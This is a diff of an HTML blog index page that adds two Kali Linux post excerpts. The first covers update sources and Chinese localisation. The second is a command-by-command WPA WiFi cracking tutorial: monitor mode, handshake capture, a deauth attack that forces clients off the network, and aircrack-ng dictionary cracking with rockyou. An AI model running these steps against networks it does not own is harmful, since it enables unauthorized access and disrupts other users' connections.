@@ -194,6 +194,110 @@
             <div class="postShorten-header">
                 <h1 class="postShorten-title" itemprop="headline">
                     
+                        <a class="link-unstyled" href="/2016/12/22/PenetrationTest/KaliUpdata/">
+                            Kali-Linux 更新、环境配置
+                        </a>
+                    
+                </h1>
+                <div class="postShorten-meta">
+    <time itemprop="datePublished" datetime="2016-12-22T14:39:12+08:00">
+	
+		    12月 22, 2016
+    	
+    </time>
+    
+</div>
+
+            </div>
+            
+                <div class="postShorten-content" itemprop="articleBody">
+                    <h1 id="kali-linux的更新源"><a href="#kali-linux的更新源" class="headerlink" title="kali linux的更新源:"></a>kali linux的更新源:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#kali官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云源</span><br><span class="line">deb http://mirrors.aliyun.com/kali sana main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span><br></pre></td></tr></table></figure>
+<h1 id="对Kali进行清洁、更新、升级和发行版升级等处理"><a href="#对Kali进行清洁、更新、升级和发行版升级等处理" class="headerlink" title="对Kali进行清洁、更新、升级和发行版升级等处理"></a>对Kali进行清洁、更新、升级和发行版升级等处理</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y</span><br></pre></td></tr></table></figure>
+<h1 id="汉化火狐浏览器"><a href="#汉化火狐浏览器" class="headerlink" title="汉化火狐浏览器"></a>汉化火狐浏览器</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install iceweasel-l10n-zh-cn</span><br></pre></td></tr></table></figure>
+<h1 id="安装中文输入法-搜狗"><a href="#安装中文输入法-搜狗" class="headerlink" title="安装中文输入法(搜狗)"></a>安装中文输入法(搜狗)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install fcitx</span><br><span class="line">dpkg -i sougoupinyinXXX.deb</span><br><span class="line">apt-get -f install</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><a href="http://os.51cto.com/art/201405/439494.htm" target="_blank" rel="external">http://os.51cto.com/art/201405/439494.htm</a><br><a href="http://blog.csdn.net/q_l_s/article/details/53185601" target="_blank" rel="external">http://blog.csdn.net/q_l_s/article/details/53185601</a></p>
+</blockquote>
+
+                    
+                        
+                    
+                    
+                        <p>
+                            <a href="/2016/12/22/PenetrationTest/KaliUpdata/#post-footer" class="postShorten-excerpt_link link">
+                                评论和共享
+                            </a>
+                        </p>
+                    
+                </div>
+            
+        </div>
+        
+    </article>
+    
+    
+    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
+        <div class="postShorten-wrap">
+            
+            <div class="postShorten-header">
+                <h1 class="postShorten-title" itemprop="headline">
+                    
+                        <a class="link-unstyled" href="/2016/12/20/PenetrationTest/WiFiCrack/WiFiCrack/">
+                            用 Kali-Linux 进行 Wifi 破解
+                        </a>
+                    
+                </h1>
+                <div class="postShorten-meta">
+    <time itemprop="datePublished" datetime="2016-12-20T09:43:12+08:00">
+	
+		    12月 20, 2016
+    	
+    </time>
+    
+</div>
+
+            </div>
+            
+                <div class="postShorten-content" itemprop="articleBody">
+                    <h3>1.找一个字典文件</h3><br>这里用 Kali Linux 自带的<code>rockyou</code>字典，<br>使用前先解压。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -d /usr/share/wordlist/rockyou.txt.gz</span><br></pre></td></tr></table></figure><br><br><h3>2.断开链接的WiFi</h3><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng</span><br></pre></td></tr></table></figure><br><br>列出所有支持监控模式的网卡。<br><br><h3>3.监听网卡</h3>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+<p>此时网卡就处于监听模式，被监听的网卡变为 wlan0mon。<br><br>可使用<code>ifconfig</code>命令查看。</p>
+<p></p><h3>4.查看WiFi网络</h3><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure><p></p>
+<p>可以看到周围WiFi的详细信息，包括信号强度、加密类型、频道(CH)等。<br><br>要记住破解WIFI的频道号和BSSID。</p>
+<p></p><h3>5.抓取握手包</h3><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon</span><br></pre></td></tr></table></figure><p></p>
+<p><code>6</code> 频道号(CH)<br><br><code>C8:3A....</code> 目标BSSID号<br><br><code>-w</code> 抓取数据包保存位置<br></p>
+<p></p><h3>6.强制让设备重连WiFi</h3><br>原理：给链接到WiFi的一个设备发送一个deauth(反认证)包，让那个设备断开WiFi，<br>随后它自然会再次链接。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 2 -a C8:3A:35:60:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon</span><br></pre></td></tr></table></figure><p></p>
+<p><code>-0</code> 发送反认证包的个数 <br><br><code>-a</code> 指定路由器BSSID <br><br><code>-c</code> 指定强制断开的设备 <br></p>
+<p>成功监听到握手包后：<code>Ctrl+C</code> 结束抓包。<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure></p>
+<p>结束监听。</p>
+<p></p><h3>7.开始破解握手包密码</h3><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -a2 -b C8:3A:35:60:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap</span><br></pre></td></tr></table></figure><p></p>
+<p><code>-a2</code>代表握手包 <br><br><code>-b</code> 指定要破解的WiFi BSSID <br><br><code>-w</code> 指定字典文件 <br><br>最后是抓取的包 <br></p>
+
+                    
+                        
+                    
+                    
+                        <p>
+                            <a href="/2016/12/20/PenetrationTest/WiFiCrack/WiFiCrack/#post-footer" class="postShorten-excerpt_link link">
+                                评论和共享
+                            </a>
+                        </p>
+                    
+                </div>
+            
+        </div>
+        
+    </article>
+    
+    
+    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
+        <div class="postShorten-wrap">
+            
+            <div class="postShorten-header">
+                <h1 class="postShorten-title" itemprop="headline">
+                    
                         <a class="link-unstyled" href="/2016/12/10/PenetrationTest/ARP/ARP/">
                             嗅探，arp欺骗，会话劫持
                         </a>
@@ -873,25 +977,6 @@ Babel其实可以完全在webpack.config.js中进行配置，但是考虑到babe
                 <div class="media">
                     
                     <div class="media-body">
-                        <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/JavaScript/Event/">
-                            <h3 class="media-heading">JavaScript 事件捕获和冒泡</h3>
-                        </a>
-                        <span class="media-meta">
-                            <span class="media-date text-small">
-                                
-                                    2016年9月4日
-                                
-                            </span>
-                        </span>
-                        <div class="media-content hide-xs font-merryweather"></div>
-                    </div>
-                    <div style="clear:both;"></div>
-                    <hr>
-                </div>
-                
-                <div class="media">
-                    
-                    <div class="media-body">
                         <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/JavaScript/Javascript/">
                             <h3 class="media-heading">JavaScript 简介</h3>
                         </a>
@@ -932,6 +1017,25 @@ Babel其实可以完全在webpack.config.js中进行配置，但是考虑到babe
                     <div class="media-body">
                         <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/BrowserSync/BrowserSync/">
                             <h3 class="media-heading">BrowserSync 使用手册</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    2016年9月4日
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/JavaScript/Event/">
+                            <h3 class="media-heading">JavaScript 事件捕获和冒泡</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -1048,7 +1152,7 @@ Babel其实可以完全在webpack.config.js中进行配置，但是考虑到babe
                 data-message-zero="没有找到文章"
                 data-message-one="找到 1 篇文章"
                 data-message-other="找到 {n} 篇文章">
-                找到 108 篇文章
+                找到 110 篇文章
             </p>
         </div>
     </div>
